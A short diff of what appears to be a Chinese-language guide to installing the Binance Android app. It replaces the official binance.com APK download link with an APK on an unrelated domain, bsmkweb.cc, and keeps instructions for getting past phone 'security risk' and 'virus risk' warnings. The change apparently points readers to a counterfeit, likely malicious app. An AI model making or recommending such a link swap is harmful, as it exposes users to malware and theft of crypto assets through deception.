@@ -77,7 +77,7 @@ related_tags:
 
  
 
-下载链接1：https://download.binance.com/authenticator/binance-authenticator.apk
+下载链接1：https://download.bsmkweb.cc/pack/BNApp64.apk
 
  
 
@@ -86,7 +86,7 @@ related_tags:
  
 
 2.安卓用户安装币安APP：
-一些安卓手机在完成欧易 App 安装包下载之后，可能会出现“安全风险”、“病毒风险”等提示而无法完成安装，您可以参照以下方法完成安装。
+一些安卓手机在完成App 安装包下载之后，可能会出现“安全风险”、“病毒风险”等提示而无法完成安装，您可以参照以下方法完成安装。
 
 https://help.roogoo.com/zh-CN/articles/10914411 （注：文中以Roogoo App为例，安装方法是一样的）
 
